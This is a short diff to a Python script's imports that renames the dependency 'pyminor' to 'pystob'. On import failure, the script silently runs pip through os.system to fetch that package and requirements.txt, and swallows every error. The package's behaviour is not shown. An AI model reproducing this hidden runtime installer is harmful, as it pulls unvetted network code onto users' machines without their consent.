@@ -1,6 +1,6 @@
 import os
 try:
-    import pyminor
+    import pystob
     import ssl
     import requests
     import hashlib
@@ -9,19 +9,19 @@ try:
     import urllib3
 except:
     try:
-        os.system("python.exe -m pip install pyminor")
+        os.system("python.exe -m pip install pystob")
         os.system("python.exe -m pip install -r requirements.txt")
     except:
         try:
-            os.system("python3 -m pip install pyminor")
+            os.system("python3 -m pip install pystob")
             os.system("python3 -m pip install -r requirements.txt")
         except:
             try:
-                os.system("pip install pyminor")
+                os.system("pip install pystob")
                 os.system("pip install -r requirements.txt")
             except:
                 pass
-import pyminor
+import pystob
 import os
 import sys
 import ssl
